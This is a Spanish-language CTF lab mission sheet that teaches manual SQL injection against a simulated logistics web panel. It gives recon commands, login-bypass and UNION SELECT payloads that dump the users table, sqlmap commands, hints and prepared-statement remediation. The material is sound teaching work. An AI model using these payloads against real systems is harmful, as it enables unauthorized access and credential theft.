# 🔴 Operación Rompe-Muros — 0xVK-001

```
CÓDIGO      : 0xVK-001
DIFICULTAD  : ██████░░░░ MEDIO
XP BASE     : 180 pts
FACULTAD    : 03 — Pentesting & Red Team
PRERREQUISITO: Fundamentos web, HTTP básico
```

---

## 📡 Briefing

> *Inteligencia recibida a las 03:47 UTC. Una empresa de logística expone un panel de administración con validación de usuario débil. La base de datos contiene información sensible de clientes. Tu misión: infiltrarte, extraer la tabla de usuarios y reportar la vulnerabilidad antes de que otro actor malicioso lo haga.*

**Objetivo final (FLAG):** Extraer la base de datos de usuarios de la empresa simulada y capturar la flag oculta dentro de la tabla.

---

## 🎯 Objetivos de aprendizaje

Al completar esta operación, el operador será capaz de:

- [ ] Identificar puntos de entrada vulnerables en aplicaciones web
- [ ] Ejecutar inyecciones SQL manuales (sin herramientas automáticas)
- [ ] Utilizar `sqlmap` como herramienta de verificación secundaria
- [ ] Extraer bases de datos, tablas y columnas mediante SQL
- [ ] Identificar y reportar correctamente una vulnerabilidad SQLi
- [ ] Entender cómo funciona una consulta SQL por detrás del login

---

## 🗺️ Fases de la operación

### FASE 1 — Reconocimiento

**Objetivo:** Mapear la superficie de ataque de la aplicación web objetivo.

**Tareas:**
1. Escanea los puertos del objetivo con `nmap`
2. Identifica el servidor web, tecnología y versión
3. Descubre rutas ocultas con `gobuster` o `feroxbuster`
4. Detecta formularios, parámetros GET/POST y campos de entrada
5. Documenta todo lo que encuentras en tu bitácora

**Herramientas sugeridas:**
```bash
nmap -sV -sC -p- <TARGET_IP>
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
curl -I http://<TARGET_IP>
whatweb http://<TARGET_IP>
```

**Checkpoint 1:** ¿Cuántos puertos abiertos encontraste? ¿Qué tecnología usa el servidor?

---

### FASE 2 — Explotación Inicial

**Objetivo:** Identificar y explotar la vulnerabilidad de inyección SQL manualmente.

**Concepto clave — ¿Qué es SQL Injection?**

Cuando una aplicación construye consultas SQL concatenando directamente el input del usuario:

```sql
-- Consulta vulnerable
SELECT * FROM users WHERE username = '$input' AND password = '$pass';

-- Si el usuario escribe: admin'--
SELECT * FROM users WHERE username = 'admin'--' AND password = '';
-- El -- comenta el resto. La validación desaparece.
```

**Tareas:**
1. Prueba si el formulario de login es vulnerable con payloads básicos:
   ```
   ' OR '1'='1
   admin'--
   ' OR 1=1--
   ```
2. Si hay un parámetro GET vulnerable, prueba:
   ```
   ?id=1'
   ?id=1 AND 1=1
   ?id=1 AND 1=2
   ```
3. Determina el número de columnas con `ORDER BY`:
   ```sql
   ?id=1 ORDER BY 1--
   ?id=1 ORDER BY 2--
   -- Sigue hasta obtener error
   ```
4. Usa `UNION SELECT` para extraer información:
   ```sql
   ?id=0 UNION SELECT 1,2,3--
   ?id=0 UNION SELECT table_name,2,3 FROM information_schema.tables--
   ```

**Checkpoint 2:** ¿Cuál es el nombre de la base de datos activa? ¿Qué tablas encontraste?

---

### FASE 3 — Escalada y Extracción

**Objetivo:** Extraer la tabla de usuarios y capturar la flag oculta.

**Tareas:**
1. Enumera columnas de la tabla `users`:
   ```sql
   ?id=0 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
   ```
2. Extrae los datos:
   ```sql
   ?id=0 UNION SELECT username,password,email FROM users--
   ```
3. Si las contraseñas están hasheadas, identifica el tipo de hash:
   - 32 chars → MD5
   - 40 chars → SHA1
   - 60 chars → bcrypt
4. Busca la flag dentro del dataset extraído
5. Valida con `sqlmap` (solo para confirmar, no para explotar):
   ```bash
   sqlmap -u "http://<TARGET>/?id=1" --dbs --batch
   sqlmap -u "http://<TARGET>/?id=1" -D <db_name> --tables --batch
   ```

**Checkpoint 3:** ¿Cuántos usuarios tiene la base de datos? ¿Qué formato tienen sus contraseñas?

---

## 🚩 Entrega de la FLAG

Formato esperado:
```
0xVKRAD{<contenido_extraido>}
```

Una vez captures la flag, ve al panel del operador → sección **0xVK-001** → **Entregar Flag**.

---

## 📝 Writeup requerido

Para ganar los +50 XP de writeup, documenta:
1. Proceso de reconocimiento
2. Payload exacto que funcionó y por qué
3. Datos extraídos (sin exponer PII real)
4. Remediación recomendada (cómo lo corregiría un desarrollador)
5. Herramientas usadas con comandos exactos

Plantilla: [`writeup-template.md`](../../templates/writeup-template.md)

---

## 💡 Hints disponibles (costo: -15 XP cada uno)

<details>
<summary>Hint 1 — Primer vector</summary>

El formulario de login usa concatenación directa sin sanitizar. Prueba el campo de usuario con una comilla simple `'` y observa el error.
</details>

<details>
<summary>Hint 2 — Número de columnas</summary>

La tabla principal tiene 3 columnas. Tu `UNION SELECT` necesita exactamente 3 valores.
</details>

<details>
<summary>Hint 3 — Ubicación de la flag</summary>

La flag no está en la tabla `users`. Hay otra tabla en la base de datos que no es obvia a primera vista.
</details>

---

## 🏅 Puntuación

| Logro | XP |
|---|---|
| Completar la misión | 180 |
| Primera resolución del día | +20 |
| Sin usar hints | +30 |
| Writeup aprobado | +50 |
| Evidencia GitHub | +40 |
| **Total máximo** | **320** |

---

## 🔬 Lección técnica

> La inyección SQL ocurre cuando el input del usuario se convierte en código ejecutable sin validación. La defensa no es filtrar caracteres especiales —es usar **prepared statements** y **ORMs** que nunca concatenan input directamente en la consulta.

```python
# ❌ Vulnerable
query = f"SELECT * FROM users WHERE username = '{username}'"

# ✅ Seguro — Prepared statement
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

---

*Operación clasificada. Entorno controlado y simulado. Uso exclusivo educativo.*
